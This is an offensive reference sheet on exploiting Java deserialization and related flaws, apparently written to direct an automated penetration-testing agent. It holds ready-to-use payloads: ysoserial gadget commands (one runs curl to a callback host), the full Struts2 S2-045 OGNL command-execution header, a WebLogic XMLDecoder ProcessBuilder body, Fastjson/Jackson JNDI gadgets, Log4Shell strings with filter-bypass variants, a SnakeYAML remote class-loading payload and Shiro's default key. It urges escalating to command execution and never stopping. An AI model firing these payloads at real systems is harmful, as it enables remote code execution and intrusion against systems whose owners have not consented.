# Java / JVM Deserialization Reference

Use when the fingerprint indicates JVM serialization, Java object mappers, or a
known Java framework CVE. Impact-first: the DNS-only gadget is the rung-1 confirm,
a benign command is the proof, the class-name 500 error IS the positive oracle.

## Contents
- Markers
- ysoserial — gadget selection and the safe DNS oracle
- Struts2 — OGNL injection
- Shiro — rememberMe default-key RCE (CVE-2016-4437)
- WebLogic — T3 / IIOP / XMLDecoder
- Fastjson / Jackson — polymorphic typing
- Log4Shell (CVE-2021-44228 / -45046 / -44832)
- JSF ViewState
- SnakeYAML
- Connector / JNDI config (indirect)
- Evidence that converts

## Markers

- Native serialization: hex `aced0005`, base64 `rO0AB...`.
- Errors that CONFIRM deserialization (capture, do not bail): `ClassNotFoundException`,
  `InvalidClassException`, `StreamCorruptedException`, `java.io.OptionalDataException`,
  `EOFException` from `ObjectInputStream`.
- Mappers: `@class`, `@type`, `autoType is not support`, `@JsonTypeInfo`, XStream
  XML aliases.
- Framework state: JSF `javax.faces.ViewState`, Shiro `rememberMe`, Struts params,
  Spring session, AMF/Hessian/T3/IIOP endpoints.

## ysoserial — gadget selection and the safe oracle

> **Tooling:** `ysoserial` is **not installed on this host**. Install it first — `curl -L -o ~/tools/ysoserial.jar https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar` — or use the alternative below. Do not silently skip the proof step; a skipped proof is a lost finding.
>
> `java` itself IS present (`java`, on PATH), so the jar runs as soon as it is
> downloaded. Call it by absolute path: `java -jar ~/tools/ysoserial.jar …`.
> No credential-free curl alternative exists — the gadget bytes have to be built.
> The one thing you CAN do with nothing installed is the error-differential oracle
> (byte-flip an owned blob and read the class-name exception), which already proves
> `readObject()` on your input.

```bash
# SAFE rung-1 oracle: DNS lookup only, NO code execution. A hit proves your bytes
# reached ObjectInputStream.readObject(). Use this first, always.
java -jar ~/tools/ysoserial.jar URLDNS "http://<id>.oob" | base64 -w0

# Proof: benign command via the classpath-appropriate gadget.
java -jar ~/tools/ysoserial.jar CommonsCollections6 'id'            | base64 -w0
java -jar ~/tools/ysoserial.jar CommonsCollections5 'curl http://<id>.oob'  # OOB when no stdout
java -jar ~/tools/ysoserial.jar CommonsBeanutils1  'whoami'
```

Pick the gadget by what is on the classpath (read `pom.xml`/`build.gradle`/JARs if
leaked; otherwise try the common ones):

| Library on classpath | Gadget(s) |
|---|---|
| commons-collections 3.1-3.2.1 | `CommonsCollections1`, `CommonsCollections5`, `CommonsCollections6`, `CommonsCollections7` |
| commons-collections4 | `CommonsCollections2`, `CommonsCollections4` |
| commons-beanutils (Shiro ships it) | `CommonsBeanutils1` |
| spring-core / spring-beans | `Spring1`, `Spring2` |
| groovy | `Groovy1` |
| clojure | `Clojure` |
| hibernate | `Hibernate1`, `Hibernate2` |
| any (outbound JRMP) | `JRMPClient` -> pair with `ysoserial ... exploit.JRMPListener` |

`CommonsCollections6` is the go-to (no `readObject` chain dependency on
Runtime.exec ordering). Deliver the base64 in the cookie/hidden-field/param where
the native blob lives.

## Struts2 — OGNL injection (not object deser, same skill surface)

- **Detection oracle:** `%{233*233}` in the vulnerable field -> reflected `54289`.
- CVE-2017-5638 (S2-045, `Content-Type` OGNL):
  ```
  Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#ct.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
  ```
- CVE-2018-11776 (S2-057, namespace OGNL), CVE-2013-2251 (`action:`/`redirect:`/
  `redirectAction:`), CVE-2019-0230 (S2-059 forced double-eval),
  CVE-2020-17530 (S2-061), CVE-2023-50164 (path traversal -> upload -> RCE).
- Prove with a benign command reflected in the response; `%{233*233}` first.

## Shiro — rememberMe default-key RCE (CVE-2016-4437)

Fingerprint: `rememberMe=invalid` -> `Set-Cookie: rememberMe=deleteMe`. Then forge
the AES-CBC(default-key) serialized gadget — full steps in
`leaked-key-forge.md` (Shiro section). Default key `kPH+bIxk5D2deZiIxcaaaA==`;
gadget usually `CommonsBeanutils1` (shiro-core ships commons-beanutils).

## WebLogic — T3 / IIOP / XMLDecoder

- **Version oracle (read-only):** raw TCP to `:7001`, send `t3 12.2.1\nAS:255\nHL:19\n\n`
  -> banner `HELO:12.2.1.x.0`.
- CVE-2015-4852 / CVE-2017-3248 / CVE-2018-2628 / CVE-2018-2893 / CVE-2020-2555
  (Coherence gadget) / CVE-2023-21839 (T3/IIOP JNDI) — T3 native deser; deliver a
  ysoserial or JRMP/JNDI gadget over the T3 protocol.
- CVE-2019-2725 (`wls-wsat`): `POST /_async/AsyncResponseService` with an
  `XMLDecoder` body:
  ```xml
  <java version="1.8" class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3"><void index="0"><string>/bin/bash</string></void>
    <void index="1"><string>-c</string></void><void index="2"><string>id</string></void></array>
    <void method="start"/></void></java>
  ```
- CVE-2020-14882 / -14883 (console path-traversal auth bypass -> Groovy/MVEL RCE).

## Fastjson / Jackson — polymorphic typing

- **Fastjson DNS oracle:** `{"@type":"java.net.Inet4Address","val":"<id>.oob"}` or
  `{"@type":"java.net.URL","val":"http://<id>.oob"}` -> DNS/HTTP callback confirms
  autoType with zero exec.
- Fastjson JNDI gadget (<=1.2.47 autoType bypass, CVE-2017-18349 / -2019 bypasses):
  ```json
  {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://<id>.oob/Exploit","autoCommit":true}
  ```
  Pair with a JNDI server (`marshalsec LDAPRefServer`, `rogue-jndi`).
- Jackson default typing (`enableDefaultTyping`, CVE-2019-12384 and the polymorphic
  CVE stream):
  ```json
  ["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://<id>.oob/x","autoCommit":true}]
  ```
- The `autoType is not support. <class>` error is a positive fingerprint — Fastjson
  is present and validating; try the current bypass, don't bail.

## Log4Shell (CVE-2021-44228 / -45046 / -44832)

- Inject `${jndi:ldap://<id>.oob/a}` into ANY logged value: `User-Agent`,
  `X-Api-Version`, `Referer`, `X-Forwarded-For`, username, search, filename.
- **Safe confirm:** `${jndi:dns://<id>.oob/x}` -> a DNS callback proves the sink
  with no code execution. Also `${hostName}` / `${env:USER}` reflected. WAF bypass:
  `${${::-j}ndi:...}`, `${jndi:${lower:l}dap://...}`.
- Use `interactsh` / canarytokens as the listener; the callback IS the finding.

## JSF ViewState

- `javax.faces.ViewState` may be a serialized Java object (MyFaces/Mojarra). If not
  encrypted/MACed (or the key leaked), it's native deser -> ysoserial gadget.
  Oracle: `ViewExpiredException` / class errors on a tampered blob confirm
  server-side deserialization.

## SnakeYAML

- `yaml.load()` (unsafe) on a YAML importer/config-editor/CI field:
  ```yaml
  !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://<id>.oob/"]]]]
  ```
  The outbound fetch is the confirm; escalate to the payload class for RCE.

## Connector / JNDI config (indirect)

Kafka Connect / operator APIs that accept `sasl.jaas.config`, login-module names,
JNDI/LDAP datasource URLs, or class names: set a JNDI/LDAP URL to your listener on
an owned connector; the outbound lookup proves the server loads attacker-steered
sources before the allowlist. Confirm the key is accepted + the callback fires.

## Evidence that converts

- DNS/HTTP callback from URLDNS / Inet4Address / `${jndi:dns}` / SnakeYAML fetch.
- Benign command output (`id`/`whoami`) reflected or exfil'd via OOB.
- Forged Shiro/JSF/ViewState token accepted (leaked-key-forge.md).
- Class/type-resolution error naming your input = deser-before-validation confirmed.

Do NOT stop at "aced0005 seen" or "autoType error" — those are the START. Climb to
the callback or the command.
